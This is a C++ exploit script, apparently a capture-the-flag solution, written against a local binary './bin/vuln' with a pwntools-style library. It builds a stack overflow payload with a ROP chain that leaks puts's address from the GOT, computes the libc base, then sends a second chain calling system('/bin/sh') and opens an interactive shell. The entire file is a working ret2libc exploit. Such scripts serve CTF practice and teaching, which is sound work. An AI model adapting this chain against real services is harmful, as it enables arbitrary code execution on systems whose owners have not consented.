#include <cstdint>
#include <ctf/ctf.hpp>
#include <iostream>

using namespace ctf;

// rip at 0x62616162
constexpr uint32_t RIP = 0x62616162;

int main() try {
    auto elf      = ELF("./bin/vuln");
    auto libc     = ELF("/lib/x86_64-linux-gnu/libc.so.6");
    auto puts_plt = elf.plt()["puts"];
    auto puts_got = elf.got()["puts"];
    auto main_sym = elf.symbols()["main"];
    auto rop      = ROP("./bin/vuln");
    auto pop_rdi  = rop.find_gadget({"pop rdi", "ret"}).at(0);
    auto ret      = rop.find_gadget({"ret"}).at(0);

    auto payload = from_ranges(
        cyclic(cyclic_find(RIP)),
        p<uint64_t>(pop_rdi),
        p<uint64_t>(puts_got),
        p<uint64_t>(ret),
        p<uint64_t>(puts_plt),
        p<uint64_t>(main_sym)
    );
    auto proc = Process("./bin/vuln");
    proc.writeln(payload);
    std::cout << proc.readln() << std::endl;

    auto leak_str = proc.readln();
    hex_println(leak_str);
    auto leak = up<uint64_t>(leak_str);
    std::cout << "0x" << std::hex << leak << std::endl;

    libc.set_address(leak - libc.symbols()["puts"]);
    auto system_sym = libc.symbols()["system"];
    auto bin_sh     = libc.strings()["/bin/sh"];
    auto exit_sym   = libc.symbols()["exit"];

    auto new_payload = from_ranges(
        cyclic(cyclic_find(RIP)),
        p<uint64_t>(pop_rdi),
        p<uint64_t>(bin_sh),
        p<uint64_t>(system_sym),
        p<uint64_t>(exit_sym)
    );
    proc.writeln(new_payload);
    proc.interactive();
} catch (const std::exception &e) {
    std::cerr << e.what() << std::endl;
}